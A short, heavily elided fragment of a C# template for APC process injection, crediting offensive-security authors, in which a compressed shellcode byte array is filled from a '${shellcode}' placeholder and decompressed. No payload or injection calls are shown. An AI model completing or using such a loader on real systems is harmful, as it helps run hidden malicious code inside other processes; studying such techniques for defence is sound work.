/*
 * https://raw.githubusercontent.com/pwndizzle/c-sharp-memory-injection/master/apc-injection-new-process.cs
 * Original code created by Casey Smith - https://gist.github.com/subTee/a8d86ee9b9792dac0f0f4b021f2763c1
 *
 * Modified and commented by @pwndizzle & @eksperience
 */
...
public class ApcInjectionNewProcess
{
	...
	{
		//  Placeholder for the actual shellcode byte array
		byte[] compressed_shellcode = new byte[] { ${shellcode} };
		byte[] shellcode = Decompress(compressed_shellcode);
